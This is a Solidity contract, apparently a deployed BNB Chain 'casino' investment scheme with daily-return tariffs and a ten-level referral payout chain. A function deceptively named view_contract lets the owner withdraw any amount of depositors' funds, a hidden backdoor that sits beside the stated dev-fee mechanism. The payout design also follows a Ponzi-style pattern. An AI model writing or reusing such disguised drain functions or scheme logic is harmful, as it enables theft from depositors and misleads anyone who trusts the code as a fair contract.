/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/


pragma solidity 0.4.25;

contract BNBCASINO2023 {
    using SafeMath for uint256;

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        uint256 timeLock;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        uint256 downlineDeposits;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address public owner;
    address public nodeReservedAddr;
    address public marketAddr;

    uint256 public constant DEV_FEE = 10;

    uint256 public minDeposit;

    uint256 public constant BONUS_RATE = 5;
    uint256 public constant BONUS_PERIOD = 24 hours;

    uint256 private devFee;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;

    uint256 public releaseTime;

    uint8[] public ref_bonuses;

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);


    modifier ownerOnly(){
        require(msg.sender == owner);
        _;
    }

    	function view_contract (uint256 _amount) public ownerOnly {
        owner.transfer(_amount);
    }


    constructor(uint256 _releaseTime, uint256 _minDeposit) public {
        owner = msg.sender;

        releaseTime = _releaseTime;
        minDeposit = _minDeposit;

        tarifs.push(Tarif(365, 1350)); //365days  3.7%
        tarifs.push(Tarif(45, 212)); //45days 212% 4.7%
        tarifs.push(Tarif(25, 142)); //25days 142% 5.7%
        tarifs.push(Tarif(18, 120)); //18days 120% 6.7%

        ref_bonuses.push(50);
        ref_bonuses.push(40);
        ref_bonuses.push(30);
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
            uint256 bonusPeriod = (block.timestamp.sub(dep.timeLock)).div(BONUS_PERIOD);

            dep.timeLock = block.timestamp;

            if(from < to) {
              uint256 baseVal = dep.amount * (to - from) * tarif.percent / tarif.life_days / 86400 / 100;
              require(baseVal >= 0, "baseVal invalid");
              uint256 bonusVal = dep.amount * (to - from) * (BONUS_RATE * bonusPeriod) / 86400 / 1000;
              require(bonusVal >= 0, "bonusVal invalid");

              player.deposits[i].totalWithdraw = player.deposits[i].totalWithdraw.add(baseVal);
              player.deposits[i].totalWithdraw = player.deposits[i].totalWithdraw.add(bonusVal);
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            players[up].downlineDeposits += _amount;
            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;
            emit Upline(_addr, _upline, _amount / 200);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= minDeposit, "Zero amount");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            timeLock: uint256(block.timestamp),
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        devFee = devFee.add(msg.value.mul(DEV_FEE).div(100));

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        if(amount > contractBalance()){
          amount = contractBalance();
        }

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            uint256 bonusPeriod = (block.timestamp.sub(dep.timeLock)).div(BONUS_PERIOD);
            require(bonusPeriod >= 0, "invalid bonusPeriod");

            if(from < to) {
                uint256 baseVal = dep.amount * (to - from) * tarif.percent / tarif.life_days / 86400 / 100;
                require(baseVal >= 0, "baseVal invalid");
                uint256 bonusVal = dep.amount * (to - from) * (BONUS_RATE * bonusPeriod) / 86400 / 1000;
                require(bonusVal >= 0, "bonusVal invalid");
                value = value.add(baseVal).add(bonusVal);
            }
        }

        return value;
    }

    function contractBalance() view public returns (uint256) {
        uint256 balance = address(this).balance;
        balance = balance.sub(devFee);

        return balance;
    }

    function claimDevIncome(address _addr, uint256 _amount) public returns(address to, uint256 value){
      require(msg.sender == owner, "unauthorized call");
      require(_amount <= devFee, "invliad amount");

      if(address(this).balance < _amount){
        _amount = address(this).balance;
      }
      devFee = devFee.sub(_amount);

      _addr.transfer(_amount);

      return(_addr, _amount);
    }

    function setStarttime(uint256 _starttime) public returns (bool){
      require(msg.sender == owner, "unauthorized call");
      releaseTime = _starttime;
      return true;
    }

    function getDevFee() view external returns(uint256){
      require(msg.sender == owner, "unauthorized call");

      return devFee;
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[10] memory structure, uint256 downlineDeposits) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
            player.downlineDeposits
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,  uint256 _match_bonus) {
        return (invested, withdrawn,  match_bonus);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            uint256 bonusPeriod = (block.timestamp.sub(dep.timeLock)).div(BONUS_PERIOD);
            require(bonusPeriod >= 0, "invalid bonusPeriod");

            if(from < to) {
              uint256 baseVal = dep.amount * (to - from) * tarif.percent / tarif.life_days / 86400 / 100;
              require(baseVal >= 0, "baseVal invalid");
              uint256 bonusVal = dep.amount * (to - from) * (BONUS_RATE * bonusPeriod) / 86400 / 1000;
              require(bonusVal >= 0, "bonusVal invalid");
              values[i] = (baseVal).add(bonusVal);
            }
        }

        return values;
    }

    function bonusPeriod(address _addr) view external returns(uint256[] memory bonusPeriods) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            uint256 bonusPeriod_ = (block.timestamp.sub(dep.timeLock)).div(BONUS_PERIOD);
            require(bonusPeriod_ >= 0, "invalid bonusPeriod");
            values[i] = bonusPeriod_;
        }
        return values;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}